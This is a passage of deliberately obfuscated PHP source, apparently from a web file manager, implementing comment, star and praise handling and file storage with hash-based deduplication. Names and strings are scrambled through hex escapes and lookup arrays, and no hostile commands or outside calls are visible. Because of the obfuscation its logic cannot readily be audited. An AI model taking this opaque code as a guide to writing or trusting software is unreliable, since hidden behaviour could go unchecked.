TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ğ¤èµó“) { $¯§”¸¹­ =& $_SERVER[¹Û¹Æ€]; if ($ğ¤èµó“[$¯§”¸¹­[1878]]) { $©û™É‘Æ = $this->where(array($¯§”¸¹­[1879] => $ğ¤èµó“[$¯§”¸¹­[1878]]))->find(); if (!$©û™É‘Æ || $©û™É‘Æ[$¯§”¸¹­[420]] != $ğ¤èµó“[$¯§”¸¹­[420]] || $©û™É‘Æ[$¯§”¸¹­[514]] != $ğ¤èµó“[$¯§”¸¹­[514]]) { return !1; } $this->where(array($¯§”¸¹­[1879] => $ğ¤èµó“[$¯§”¸¹­[1878]]))->setAdd($¯§”¸¹­[1880], 1); } $ğ¤èµó“[$¯§”¸¹­[1881]] = 0; $ğ¤èµó“[$¯§”¸¹­[1880]] = 0; $ğ¤èµó“[$¯§”¸¹­[748]] = 1; return $this->add($ğ¤èµó“); } public function commentCount($³ÔòóÛº, $úßĞø„, $¦úÖÙ±í = false) { $åÂÉİğ± =& $_SERVER[¹Û¹Æ€]; if (!$³ÔòóÛº) { return array(); } if (is_string($³ÔòóÛº) || is_int($³ÔòóÛº)) { $³ÔòóÛº = array($³ÔòóÛº); } $ÙÛ¶åÃŠ = array($åÂÉİğ±[514], $åÂÉİğ±[1882] => $åÂÉİğ±[509]); $ªüÉÎÛ = array($åÂÉİğ±[514] => array($åÂÉİğ±[17], $³ÔòóÛº), $åÂÉİğ±[420] => $úßĞø„); if ($¦úÖÙ±í) { $ªüÉÎÛ[$åÂÉİğ±[1659]] = $¦úÖÙ±í; } $¿É”µ¼Ö = $this->field($ÙÛ¶åÃŠ)->where($ªüÉÎÛ)->group($åÂÉİğ±[514])->select(); return array_to_keyvalue($¿É”µ¼Ö, $åÂÉİğ±[514], $åÂÉİğ±[509]); } public function starTarget($¸Íš¸ƒË, $É·­Õú¥) { $ç… Û´• =& $_SERVER[¹Û¹Æ€]; $¨Ó—â˜  = $¸Íš¸ƒË + self::TYPE_STAR_OFFSET; $ış¾Áâ÷ = array($ç… Û´•[1659] => USER_ID, $ç… Û´•[420] => $¨Ó—â˜ , $ç… Û´•[514] => $É·­Õú¥); $º†Ëñï„ = $this->where($ış¾Áâ÷)->find(); if ($º†Ëñï„) { return $this->where(array($ç… Û´•[408] => $º†Ëñï„[$ç… Û´•[408]]))->delete(); } $ãÖ—Ñ»° = array($ç… Û´•[1878] => 0, $ç… Û´•[1659] => USER_ID, $ç… Û´•[748] => 1, $ç… Û´•[753] => $ç… Û´•[22], $ç… Û´•[420] => $¨Ó—â˜ , $ç… Û´•[514] => $É·­Õú¥, $ç… Û´•[1881] => 0, $ç… Û´•[1880] => 0); return $this->add($ãÖ—Ñ»°); } public function starTargetCount($ó‘µğåÒ, $àÇçö¼”) { $ „È×Ã® =& $_SERVER[¹Û¹Æ€]; $–•Ü‘Ç² = $àÇçö¼” + self::TYPE_STAR_OFFSET; $¡ìÕõ´À = $this->commentCount($ó‘µğåÒ, $–•Ü‘Ç²); $ø‡½‚Æ = $this->commentCount($ó‘µğåÒ, $–•Ü‘Ç², USER_ID); return array($ „È×Ã®[1883] => $¡ìÕõ´À, $ „È×Ã®[1884] => $ø‡½‚Æ); } public function starTargetUserList($Œ‹ê®âÇ, $üû–şèÅ) { $¯íéúà =& $_SERVER[¹Û¹Æ€]; $İöó» ß = $Œ‹ê®âÇ + self::TYPE_STAR_OFFSET; $õ“êíß¼ = array($¯íéúà[514] => $üû–şèÅ, $¯íéúà[420] => $İöó» ß); $›ÛãÊû™ = $this->where($õ“êíß¼)->count(); $ÒšùÓì• = array($¯íéúà[264] => $›ÛãÊû™, $¯íéúà[1885] => array()); if (!$›ÛãÊû™) { return $ÒšùÓì•; } $—¦¶¾÷ğ = $this->field($¯íéúà[1659])->where($õ“êíß¼)->limit(500)->select(); $—¦¶¾÷ğ = array_to_keyvalue($—¦¶¾÷ğ, $¯íéúà[22], $¯íéúà[1659]); $ÒšùÓì•[$¯íéúà[1885]] = Model($¯íéúà[522])->userListInfo($—¦¶¾÷ğ); return $ÒšùÓì•; } public function prasiseUserList($ËÂâ½öŠ) { $ÆÉÓÒù¸ =& $_SERVER[¹Û¹Æ€]; $ş“È‡Îñ = array($ÆÉÓÒù¸[1886] => $ËÂâ½öŠ); $éµã§÷° = $this->where($ş“È‡Îñ)->find(); $Íáı¦ £ = _get($éµã§÷°, $ÆÉÓÒù¸[1881], 0); $¬¼°ĞŒÀ = array($ÆÉÓÒù¸[264] => $Íáı¦ £, $ÆÉÓÒù¸[1885] => array()); if (!$Íáı¦ £) { return $¬¼°ĞŒÀ; } $ëÀß¦ŠŠ = Model($ÆÉÓÒù¸[1887])->field($ÆÉÓÒù¸[1659])->where($ş“È‡Îñ)->limit(500)->select(); $ëÀß¦ŠŠ = array_to_keyvalue($ëÀß¦ŠŠ, $ÆÉÓÒù¸[22], $ÆÉÓÒù¸[1659]); $¬¼°ĞŒÀ[$ÆÉÓÒù¸[1885]] = Model($ÆÉÓÒù¸[522])->userListInfo($ëÀß¦ŠŠ); return $¬¼°ĞŒÀ; } public function remove($åÏ³‘Ğ) { $ƒ¼‹ƒ– =& $_SERVER[¹Û¹Æ€]; $Á–¶ãÑ‚ = array($ƒ¼‹ƒ–[1879] => $åÏ³‘Ğ); $òÂ€ĞÈ¦ = $this->where($Á–¶ãÑ‚)->find(); if ($òÂ€ĞÈ¦[$ƒ¼‹ƒ–[1878]]) { $this->where(array($ƒ¼‹ƒ–[1879] => $òÂ€ĞÈ¦[$ƒ¼‹ƒ–[1878]]))->setAdd($ƒ¼‹ƒ–[1880], -1); } return $this->where($Á–¶ãÑ‚)->delete(); } public function edit($×£ÒğåĞ, $êƒä¸úğ) { $ÇÆ¹€Ûù =& $_SERVER[¹Û¹Æ€]; $Ã®¸ş• = array($ÇÆ¹€Ûù[1879] => $×£ÒğåĞ); return $this->where($Ã®¸ş•)->save(array($ÇÆ¹€Ûù[1888] => $êƒä¸úğ)); } public function prasise($·Ô±ºé) { $¾‹°ãï =& $_SERVER[¹Û¹Æ€]; $Í‘ÚÓ = Model($¾‹°ãï[1889]); $¤€¼‚‚ = array($¾‹°ãï[1879] => $·Ô±ºé, $¾‹°ãï[1650] => USER_ID); $‰ÇÜØí… = $Í‘ÚÓ->where($¤€¼‚‚)->find(); if (!$‰ÇÜØí…) { $Í‘ÚÓ->add($¤€¼‚‚); $æ¼³şè = $this->where(array($¾‹°ãï[1879] => $·Ô±ºé))->setAdd($¾‹°ãï[1881], 1); } else { $Í‘ÚÓ->where($¤€¼‚‚)->delete(); $æ¼³şè = $this->where(array($¾‹°ãï[1879] => $·Ô±ºé))->setAdd($¾‹°ãï[1881], -1); } return $æ¼³şè; } public function targetInfo($‘ÅØ„÷ò, $—¥©¤Ïš) { $Í…ÔÚ’® =& $_SERVER[¹Û¹Æ€]; $…Î³Ñùì = array($Í…ÔÚ’®[595] => $‘ÅØ„÷ò, $Í…ÔÚ’®[596] => $—¥©¤Ïš); $¢şª×¡À = $this->where($…Î³Ñùì)->count(); $ÃíÑãşñ = "\x52\x49\107\x48\x54\40\112\x4f\111\x4e\40{$this->tablePrefix}\143\x6f\155\x6d\145\156\x74\137\x70\162\141\151\163\x65\40\x73\164\x61\162\40\157\156\40\x63\x6f\x6d\155\145\156\164\x2e\x63\x6f\x6d\x6d\x65\x6e\164\111\104\x20\75\x20\163\164\141\x72\56\143\157\x6d\155\x65\x6e\x74\111\104"; $œ°úòƒ¾ = $this->alias($Í…ÔÚ’®[363])->where($…Î³Ñùì)->join($ÃíÑãşñ, $Í…ÔÚ’®[1890])->count(); $ŸëÇ¬– = array($Í…ÔÚ’®[1891] => $¢şª×¡À, $Í…ÔÚ’®[1892] => $œ°úòƒ¾); return $ŸëÇ¬–; } public function listData($Äñ¥¥ë») { $ê‚„Ş =& $_SERVER[¹Û¹Æ€]; if (isset($Äñ¥¥ë»[$ê‚„Ş[1893]])) { if ($Äñ¥¥ë»[$ê‚„Ş[1893]]) { $Äñ¥¥ë»[$ê‚„Ş[1886]] = array($ê‚„Ş[1011], intval($Äñ¥¥ë»[$ê‚„Ş[1893]])); } unset($Äñ¥¥ë»[$ê‚„Ş[1893]]); } if (isset($Äñ¥¥ë»[$ê‚„Ş[1894]])) { if ($Äñ¥¥ë»[$ê‚„Ş[1894]]) { $Äñ¥¥ë»[$ê‚„Ş[1886]] = array($ê‚„Ş[1008], intval($Äñ¥¥ë»[$ê‚„Ş[1894]])); } unset($Äñ¥¥ë»[$ê‚„Ş[1894]]); } return $this->_listData($Äñ¥¥ë»); } private function _listData($±™Ÿø÷–) { $Çé›Ÿã´ =& $_SERVER[¹Û¹Æ€]; $‚¦şÉÖä = $this->where($±™Ÿø÷–)->_makeOrder()->selectPage(100); $this->_listAppendParent($‚¦şÉÖä[$Çé›Ÿã´[378]]); $this->_listAppendUser($‚¦şÉÖä[$Çé›Ÿã´[378]]); $this->_listAppendMeta($‚¦şÉÖä[$Çé›Ÿã´[378]]); return $‚¦şÉÖä; } private function _makeOrder() { $Û‹‘½ı =& $_SERVER[¹Û¹Æ€]; $è¦Óıè© = array($Û‹‘½ı[1881], $Û‹‘½ı[1880], $Û‹‘½ı[210]); $Šºè™™à = Input::get($Û‹‘½ı[466], $Û‹‘½ı[17], $Û‹‘½ı[432], $è¦Óıè©); $ßÅéÇÙ½ = Input::get($Û‹‘½ı[467], $Û‹‘½ı[17], $Û‹‘½ı[1652], array($Û‹‘½ı[1895], $Û‹‘½ı[462])); $¼Ê³Ùè÷ = $Šºè™™à . $Û‹‘½ı[63] . $ßÅéÇÙ½; return $this->order($¼Ê³Ùè÷); } private function _listAppendParent(&$Ÿ½´ÃôÀ) { $Í¨àëÛŠ =& $_SERVER[¹Û¹Æ€]; $¾ìáê¡ = array_unique(array_to_keyvalue($Ÿ½´ÃôÀ, $Í¨àëÛŠ[22], $Í¨àëÛŠ[1878])); $¾ìáê¡ = array_remove_value($¾ìáê¡, $Í¨àëÛŠ[207]); if (!$¾ìáê¡) { return; } $ˆà£‹÷ = $this->where(array($Í¨àëÛŠ[1879] => array($Í¨àëÛŠ[17], $¾ìáê¡)))->select(); $ˆà£‹÷ = array_to_keyvalue($ˆà£‹÷, $Í¨àëÛŠ[1886]); foreach ($Ÿ½´ÃôÀ as &$¯ÆÒ™ÀÙ) { if (isset($ˆà£‹÷[$¯ÆÒ™ÀÙ[$Í¨àëÛŠ[1878]]])) { $¯ÆÒ™ÀÙ[$Í¨àëÛŠ[1896]] = $ˆà£‹÷[$¯ÆÒ™ÀÙ[$Í¨àëÛŠ[1878]]]; } } unset($¯ÆÒ™ÀÙ); } private function _listAppendUser(&$Æï¦ïµ) { $Ø‡ËëÕ° =& $_SERVER[¹Û¹Æ€]; $øÕæÆÂº = array_unique(array_to_keyvalue($Æï¦ïµ, $Ø‡ËëÕ°[22], $Ø‡ËëÕ°[1659])); $øÕæÆÂº = array_remove_value($øÕæÆÂº, $Ø‡ËëÕ°[207]); if (count($øÕæÆÂº) == 0) { return; } foreach ($Æï¦ïµ as $Å›Åƒù™) { if (isset($Å›Åƒù™[$Ø‡ËëÕ°[1896]])) { $øÕæÆÂº[] = $Å›Åƒù™[$Ø‡ËëÕ°[1896]][$Ø‡ËëÕ°[1659]]; } } $ŒòúôÍ± = Model($Ø‡ËëÕ°[544])->userListInfo($øÕæÆÂº); foreach ($Æï¦ïµ as &$Å›Åƒù™) { $Å›Åƒù™[$Ø‡ËëÕ°[609]] = $ŒòúôÍ±[$Å›Åƒù™[$Ø‡ËëÕ°[1659]]]; if (isset($Å›Åƒù™[$Ø‡ËëÕ°[1896]])) { $Å›Åƒù™[$Ø‡ËëÕ°[1896]][$Ø‡ËëÕ°[609]] = $ŒòúôÍ±[$Å›Åƒù™[$Ø‡ËëÕ°[1896]][$Ø‡ËëÕ°[1659]]]; } } unset($Å›Åƒù™); } private function _listAppendMeta(&$éı¹øŠ) { $¦ğÙÄµÖ =& $_SERVER[¹Û¹Æ€]; $ÃÄ˜Â¬´ = array_unique(array_to_keyvalue($éı¹øŠ, $¦ğÙÄµÖ[22], $¦ğÙÄµÖ[1886])); $ÃÄ˜Â¬´ = array_remove_value($ÃÄ˜Â¬´, $¦ğÙÄµÖ[207]); if (!$ÃÄ˜Â¬´) { return; } foreach ($éı¹øŠ as $Ùãª‹ƒ§) { if (isset($Ùãª‹ƒ§[$¦ğÙÄµÖ[1896]])) { $ÃÄ˜Â¬´[] = $Ùãª‹ƒ§[$¦ğÙÄµÖ[1896]][$¦ğÙÄµÖ[1886]]; } } $…ô•İå¦ = $this->metaList($ÃÄ˜Â¬´); if (!$…ô•İå¦) { return !1; } foreach ($éı¹øŠ as &$Ùãª‹ƒ§) { $Ùãª‹ƒ§[$¦ğÙÄµÖ[475]] = $…ô•İå¦[$Ùãª‹ƒ§[$¦ğÙÄµÖ[1886]]]; if (isset($Ùãª‹ƒ§[$¦ğÙÄµÖ[1896]])) { $Ùãª‹ƒ§[$¦ğÙÄµÖ[1896]][$¦ğÙÄµÖ[475]] = $…ô•İå¦[$Ùãª‹ƒ§[$¦ğÙÄµÖ[1896]][$¦ğÙÄµÖ[1886]]]; } } unset($Ùãª‹ƒ§); } private function metaList($£È¢û¯²) { $µÄÁÉ±ï =& $_SERVER[¹Û¹Æ€]; if (!$£È¢û¯²) { return array(); } $±®¶š¢ = array($µÄÁÉ±ï[1886] => array($µÄÁÉ±ï[17], $£È¢û¯²)); $«§÷óÚ” = Model($µÄÁÉ±ï[1897])->where($±®¶š¢)->select(); $«§÷óÚ” = array_to_keyvalue_group($«§÷óÚ”, $µÄÁÉ±ï[1886]); foreach ($«§÷óÚ” as $Ä«è¶‘ => $ùá½Šæö) { $½ğÔ•ñ¥ = array(); foreach ($ùá½Šæö as $á¼ÖÒã) { $½ğÔ•ñ¥[$á¼ÖÒã[$µÄÁÉ±ï[104]]] = $á¼ÖÒã[$µÄÁÉ±ï[383]]; } $«§÷óÚ”[$Ä«è¶‘] = $½ğÔ•ñ¥; } return $«§÷óÚ” ? $«§÷óÚ” : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\157\137\x66\151\154\145\x5f\x63\x6f\156\x74\145\x6e\x74\163"; protected $dataAuto = array(array("\x63\x72\x65\x61\164\x65\124\151\155\145", "\164\x69\155\x65", "\x69\156\163\x65\162\164", "\x66\165\x6e\x63\164\151\x6f\x6e")); } class FileModel extends ModelBase { protected $tableName = "\x69\157\x5f\146\x69\x6c\145"; protected $tableMeta = array("\164\x61\x62\x6c\x65\116\x61\x6d\145" => "\151\157\x5f\x66\x69\x6c\145\x5f\155\x65\x74\x61", "\155\145\x74\141\x46\x69\145\154\x64" => "\x66\x69\x6c\x65\111\x44"); public function fileInfo($ÓŒÍ¿Šæ) { $‘‘˜š¯Ü =& $_SERVER[¹Û¹Æ€]; static $îÖ£Û£† = array(); if (!isset($îÖ£Û£†[$ÓŒÍ¿Šæ])) { $Œ’¿ö = $‘‘˜š¯Ü[1898]; $Ë»“©­ = Model($‘‘˜š¯Ü[480])->field($Œ’¿ö)->where(array($‘‘˜š¯Ü[478] => $ÓŒÍ¿Šæ))->find(); $îÖ£Û£†[$ÓŒÍ¿Šæ] = $Ë»“©­; } return $îÖ£Û£†[$ÓŒÍ¿Šæ]; } public function addFileByContent($Äà = '', $Š­› èÙ = '') { $ıÂ‚¦î =& $_SERVER[¹Û¹Æ€]; $™»»’°… = TEMP_PATH . $ıÂ‚¦î[1899]; if (!is_dir($™»»’°…)) { mk_dir($™»»’°…); } $‚ìú©Ù = $™»»’°… . $ıÂ‚¦î[1900] . rand_string(16); file_put_contents($‚ìú©Ù, $Äà); $àÔŒùÄ = $this->addFile($‚ìú©Ù, $Š­› èÙ, !0); if (file_exists($‚ìú©Ù)) { @unlink($‚ìú©Ù); } return $àÔŒùÄ; } public function createFileName($³ıÇêŠÏ, $Š…ÔŠ¢ = false, $¡ÃåÉÚ = false) { $´¢¡‘Ñå =& $_SERVER[¹Û¹Æ€]; $ÚŠ»‹Û = IO::init($´¢¡‘Ñå[18]); $€ç­È“‡ = $this->makeFilePath($³ıÇêŠÏ, $ÚŠ»‹Û, $Š…ÔŠ¢, $¡ÃåÉÚ); $®şš¬Æ = $ÚŠ»‹Û->pathFather($€ç­È“‡); static $ëñ­Œ”‘ = false; $Áã½Œî = $´¢¡‘Ñå[1901] . md5($®şš¬Æ); if (!$ëñ­Œ”‘ && !Cache::get($Áã½Œî)) { $ëñ­Œ”‘ = !0; $íçŒóæ¼ = IO::mkdir($®şš¬Æ); if (!IO::exist($íçŒóæ¼ . $´¢¡‘Ñå[795])) { IO::mkfile($íçŒóæ¼ . $´¢¡‘Ñå[795]); } Cache::set($Áã½Œî, 1, 3600 * 2); } return $€ç­È“‡; } public function makeFilePath($ıÂÊæ½, $Ï£·ÉçÃ, $·š¢Òº = false, $¾×±í À = false) { $ÇˆóÊ¸ò =& $_SERVER[¹Û¹Æ€]; $¨òé´— = Model($ÇˆóÊ¸ò[768])->get($ÇˆóÊ¸ò[1902]); $Ø¿ÔÏœÔ = KodIO::defaultIO() . date($ÇˆóÊ¸ò[1903]); $ˆ½İùÉ = $Ø¿ÔÏœÔ . rand_string(5) . short_id(100); $ıÂÊæ½ = str_replace($ÇˆóÊ¸ò[18], $ÇˆóÊ¸ò[21], KodIO::clear($ıÂÊæ½)); $ìŒşééó = $Ï£·ÉçÃ->ext($ıÂÊæ½); if (!$ıÂÊæ½) { $¨òé´— = $ÇˆóÊ¸ò[1904]; } switch ($¨òé´—) { case $ÇˆóÊ¸ò[1905]: $ˆ½İùÉ = $ˆ½İùÉ . $ÇˆóÊ¸ò[20] . $Ï£·ÉçÃ->ext($ıÂÊæ½); if ($ìŒşééó == $ÇˆóÊ¸ò[1842]) { $ˆ½İùÉ .= $ÇˆóÊ¸ò[1204]; } break; case $ÇˆóÊ¸ò[1906]: $ÍñŞıÃÄ = Model($ÇˆóÊ¸ò[768])->get($ÇˆóÊ¸ò[769]); $Â§ØÍ¶ = substr(md5($ÇˆóÊ¸ò[770] . $ÍñŞıÃÄ . date($ÇˆóÊ¸ò[746])), 0, 8); $…é¾È¥ = KodIO::defaultDriver(); $Ø¿ÔÏœÔ = $ÇˆóÊ¸ò[1235] . $…é¾È¥[$ÇˆóÊ¸ò[408]] . $ÇˆóÊ¸ò[418] . date($ÇˆóÊ¸ò[1907]) . $Â§ØÍ¶ . $ÇˆóÊ¸ò[18]; if ($ìŒşééó == $ÇˆóÊ¸ò[1842]) { $ıÂÊæ½ .= $ÇˆóÊ¸ò[1204]; } $şÙ ”à = $ÇˆóÊ¸ò[1908] . $Ø¿ÔÏœÔ . $ıÂÊæ½; CacheLock::lock($şÙ ”à); $ˆ½İùÉ = $Ø¿ÔÏœÔ . $ıÂÊæ½; if (IO::exist($Ø¿ÔÏœÔ . $ıÂÊæ½)) { $®º¬¸±Ô = substr($ıÂÊæ½, 0, strlen($ıÂÊæ½) - strlen($ìŒşééó)); $ÂøÈš¥ = $¾×±í À ? substr($¾×±í À, 0, 5) : ($·š¢Òº ? substr($·š¢Òº, 0, 5) : rand_string(5)); $ˆ½İùÉ = $Ø¿ÔÏœÔ . $®º¬¸±Ô . $ÂøÈš¥ . $ÇˆóÊ¸ò[20] . $ìŒşééó; } if (IO::isTypeObject($ˆ½İùÉ) && !IO::isUploadServer($ˆ½İùÉ)) { if (IO::exist($ˆ½İùÉ)) { return $ˆ½İùÉ; } $ìÌ¶…Õõ = IO::setContent($ˆ½İùÉ, $ÇˆóÊ¸ò[22]); if (!$ìÌ¶…Õõ) { show_json($ÇˆóÊ¸ò[1909], !1); } } CacheLock::unlock($şÙ ”à); break; case $ÇˆóÊ¸ò[1904]: break; default: break; } return $ˆ½İùÉ; } public function addFileByRemote($ŞºÌÙ, $ğŞÀìˆ, $Ÿè±êÕÒ = array()) { $Ü›‘Íö˜ =& $_SERVER[¹Û¹Æ€]; if (!IO::exist($ŞºÌÙ)) { return !1; } $Õ¹’Şö® = $Ÿè±êÕÒ[$Ü›‘Íö˜[186]] ? $Ÿè±êÕÒ[$Ü›‘Íö˜[186]] : $Ü›‘Íö˜[22]; $Éù£¼Ùñ = IO::hashMd5($ŞºÌÙ, $Õ¹’Şö®); $½º‰Ğı = KodIO::defaultDriver(); $æüÖ÷éù = array($Ü›‘Íö˜[594] => IO::size($ŞºÌÙ), $Ü›‘Íö˜[1910] => 1, $Ü›‘Íö˜[429] => $ğŞÀìˆ, $Ü›‘Íö˜[806] => $½º‰Ğı[$Ü›‘Íö˜[408]], $Ü›‘Íö˜[430] => $ŞºÌÙ, $Ü›‘Íö˜[1911] => $Ÿè±êÕÒ[$Ü›‘Íö˜[187]] ? $Ÿè±êÕÒ[$Ü›‘Íö˜[187]] : IO::hashSimple($ŞºÌÙ), $Ü›‘Íö˜[1912] => $Éù£¼Ùñ ? $Éù£¼Ùñ : $Õ¹’Şö®); if ($Ğ³Ï–½’ = $this->addFileCheckExist($æüÖ÷éù[$Ü›‘Íö˜[187]], $æüÖ÷éù[$Ü›‘Íö˜[186]], $æüÖ÷éù[$Ü›‘Íö˜[86]])) { return $Ğ³Ï–½’; } return $this->addFileData($æüÖ÷éù); } private function addFileData($úš¾À½Û) { $¹ÒöÇáØ =& $_SERVER[¹Û¹Æ€]; if (!$úš¾À½Û) { return !1; } $úš¾À½Û[$¹ÒöÇáØ[86]] = intval($úš¾À½Û[$¹ÒöÇáØ[86]]); if (!$úš¾À½Û[$¹ÒöÇáØ[86]] && strlen($úš¾À½Û[$¹ÒöÇáØ[187]]) > 32) { $úš¾À½Û[$¹ÒöÇáØ[86]] = intval(substr($úš¾À½Û[$¹ÒöÇáØ[187]], 32)); } $áü›œ¯˜ = $this->add($úš¾À½Û); return $this->find($áü›œ¯˜); } public function addFile($‚™™í‹Š, $ª³’í°Ó, $‘¡öÎ‘Ÿ = false) { $ì¨æ…¶Œ =& $_SERVER[¹Û¹Æ€]; $ıÃô¥ö¸ = IO::hashSimple($‚™™í‹Š); $º«’ˆõ = IO::size($‚™™í‹Š); $òç…ÏŠÌ = $º«’ˆõ <= 1024 * 1024 * 10 ? IO::hashMd5($‚™™í‹Š) : $ì¨æ…¶Œ[22]; $ôÍÉƒ©‘ = $ì¨æ…¶Œ[1913] . $ıÃô¥ö¸; CacheLock::lock($ôÍÉƒ©‘); if ($òç…ÏŠÌ && $ıÃô¥ö¸) { $ÄùÁ´¤Ş = $this->addFileCheckExist($ıÃô¥ö¸, $òç…ÏŠÌ, $º«’ˆõ); if ($ÄùÁ´¤Ş) { CacheLock::unlock($ôÍÉƒ©‘); return $ÄùÁ´¤Ş; } } $› “Ÿçõ = $this->addFileMake($‚™™í‹Š, $º«’ˆõ, $ıÃô¥ö¸, $òç…ÏŠÌ, $ª³’í°Ó, $‘¡öÎ‘Ÿ); $âÆàÈˆ = $this->addFileData($› “Ÿçõ); CacheLock::unlock($ôÍÉƒ©‘); if (!$òç…ÏŠÌ && $âÆàÈˆ) { $this->fileMd5Check($âÆàÈˆ); } return $âÆàÈˆ; } private function fileMd5Check($´³—éÊ‡) { $™–óò¸Š =& $_SERVER[¹Û¹Æ€]; $Ò«…çÌ¬ = array($´³—éÊ‡[$™–óò¸Š[477]], $´³—éÊ‡[$™–óò¸Š[94]]); $¤Œöƒ‰ = $™–óò¸Š[1914] . $´³—éÊ‡[$™–óò¸Š[94]]; $¦º„à€† = $™–óò¸Š[1915] . $´³—éÊ‡[$™–óò¸Š[477]]; $”Çä¼ô = TaskQueue::add($™–óò¸Š[1916], $Ò«…çÌ¬, $¤Œöƒ‰, $¦º„à€†); if (!$”Çä¼ô) { $this->fileMd5Set($´³—éÊ‡[$™–óò¸Š[477]], $´³—éÊ‡[$™–óò¸Š[94]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($æ¯” áİ, $öêÅ¹°) { $”¬ÈïæÚ =& $_SERVER[¹Û¹Æ€]; $Ã•ˆªíµ = $this->find($æ¯” áİ); if (!$Ã•ˆªíµ || $Ã•ˆªíµ[$”¬ÈïæÚ[186]]) { return; } $úÊèÅÑ± = IO::hashMd5($öêÅ¹°); if (!$úÊèÅÑ±) { return $”¬ÈïæÚ[22]; } $this->where(array($”¬ÈïæÚ[477] => $æ¯” áİ))->save(array($”¬ÈïæÚ[186] => $úÊèÅÑ±)); } public function addFileMake($ëÅ¹©‡, $»–ÂúÚØ, $’ÆµÔê, $ßİÓ½î˜, $ÓäáïÒì, $¾ÃÒÍûó) { $µ§±›ËÌ =& $_SERVER[¹Û¹Æ€]; $×ç ÔÙ¡ = $this->createFileName($ÓäáïÒì, $’ÆµÔê, $ßİÓ½î˜); $³®”û€Í = get_path_father($×ç ÔÙ¡); $èÜ¸¾ô‚ = get_path_this($×ç ÔÙ¡); if ($¾ÃÒÍûó) { $‘ÓØŒ = IO::move($ëÅ¹©‡, $³®”û€Í, !1, $èÜ¸¾ô‚); } else { $‘ÓØŒ = IO::copy($ëÅ¹©‡, $³®”û€Í, !1, $èÜ¸¾ô‚); } if (!$‘ÓØŒ) { return !1; } $Ñ´¡†”¨ = KodIO::defaultDriver(); $„—¿š‚  = array($µ§±›ËÌ[594] => $»–ÂúÚØ, $µ§±›ËÌ[1910] => 1, $µ§±›ËÌ[429] => $ÓäáïÒì, $µ§±›ËÌ[806] => $Ñ´¡†”¨[$µ§±›ËÌ[408]], $µ§±›ËÌ[430] => $×ç ÔÙ¡, $µ§±›ËÌ[1911] => $’ÆµÔê, $µ§±›ËÌ[1912] => $ßİÓ½î˜); return $„—¿š‚ ; } public function addFileCheckExist($Êç½¸§Ó, $ø³§¸­Ë, $÷Ğ—ùƒ¦) { $Îµ“Ğ =& $_SERVER[¹Û¹Æ€]; $ïúç³Šè = $this->findByHash($Êç½¸§Ó, $ø³§¸­Ë); if (!$ïúç³Šè) { return !1; } $Æå‹Âˆ = array($Îµ“Ğ[1910] => intval($ïúç³Šè[$Îµ“Ğ[1917]]) + 1, $Îµ“Ğ[594] => $÷Ğ—ùƒ¦); $this->where(array($Îµ“Ğ[478] => $ïúç³Šè[$Îµ“Ğ[477]]))->save($Æå‹Âˆ); return $ïúç³Šè; } public function remove($‰Ü›Ê’…) { $this->linkCountChange($‰Ü›Ê’…, !1); $this->clearEmpty(); return !0; } public function linkAdd($õ¶÷ëÑò) { $this->linkCountChange($õ¶÷ëÑò, !0); } public function linkCountChange($™×ğš¯Ü, $ˆ®ÉØ) { $çÈ¶Ö‹ã =& $_SERVER[¹Û¹Æ€]; if (!$™×ğš¯Ü) { return; } if (!is_array($™×ğš¯Ü)) { $™×ğš¯Ü = array($™×ğš¯Ü); } $àÑèÅù¿ = array(); foreach ($™×ğš¯Ü as $şãıÃ¤ˆ) { $ƒ®Äë†³ = $şãıÃ¤ˆ . $çÈ¶Ö‹ã[22]; if (!$àÑèÅù¿[$ƒ®Äë†³]) { $àÑèÅù¿[$ƒ®Äë†³] = 0; } $àÑèÅù¿[$ƒ®Äë†³]++; } $¹—á€ıì = array(); foreach ($àÑèÅù¿ as $şãıÃ¤ˆ => $òª¢ìÛ) { $ƒ®Äë†³ = $òª¢ìÛ . $çÈ¶Ö‹ã[22]; if (!$¹—á€ıì[$ƒ®Äë†³]) { $¹—á€ıì[$ƒ®Äë†³] = array(); } $¹—á€ıì[$ƒ®Äë†³][] = $şãıÃ¤ˆ; } foreach ($¹—á€ıì as $òª¢ìÛ => $ü¿ÀÜøÌ) { if (!$ü¿ÀÜøÌ) { continue; } $òª¢ìÛ = $ˆ®ÉØ ? $òª¢ìÛ : -intval($òª¢ìÛ); $ï¹ñ€¸ = array($çÈ¶Ö‹ã[477] => array($çÈ¶Ö‹ã[17], $ü¿ÀÜøÌ)); if ($òª¢ìÛ < 0) { $ï¹ñ€¸[$çÈ¶Ö‹ã[1917]] = array($çÈ¶Ö‹ã[1012], abs($òª¢ìÛ)); } $this->where($ï¹ñ€¸)->setAdd($çÈ¶Ö‹ã[1917], $òª¢ìÛ); } } public function findByHash($ÊãÖ€, $Õ°Ş×Ã = false) { $ßı”ß =& $_SERVER[¹Û¹Æ€]; if (!$ÊãÖ€ && !$Õ°Ş×Ã) { return !1; } $£“–ó¹ = array($ßı”ß[1911] => $ÊãÖ€); if ($Õ°Ş×Ã) { $£“–ó¹ = array($ßı”ß[1912] => $Õ°Ş×Ã); } return $this->order($ßı”ß[1918])->where($£“–ó¹)->find(); } public function clearEmpty($é‹ûÜÍÁ = 0) { $İä½”˜ =& $_SERVER[¹Û¹Æ€]; $ÒĞÖ¡ÎŠ = time() - 3600 * 24 * $é‹ûÜÍÁ; $ÎˆÁ‹ñ” = $İä½”˜[1919] . $ÒĞÖ¡ÎŠ; $¥¯³±‰ü = $this->where($ÎˆÁ‹ñ”)->select(); if (!$¥¯³±‰ü) { return; } $ÍïÀÏÎ¦ = new Task($İä½”˜[1920], $İä½”˜[22], count($¥¯³±‰ü)); foreach ($¥¯³±‰ü as $ÕÒ¢ÎÃ•) { $ÍïÀÏÎ¦->update(1); $this->resetFile($ÕÒ¢ÎÃ•); } $ÍïÀÏÎ¦->end(); } public function resetFile($™ƒµıÙÓ) { $óÁİ°¬— =& $_SERVER[¹Û¹Æ€]; $÷İ¶£ƒŸ = array($óÁİ°¬—[478] => $™ƒµıÙÓ[$óÁİ°¬—[477]]); $Óã¨ß§Û = Model($óÁİ°¬—[1333])->where($÷İ¶£ƒŸ)->count(); $Û©À÷ÇÕ = Model($óÁİ°¬—[1921])->where($÷İ¶£ƒŸ)->count(); $­ñ¬¦õ“ = 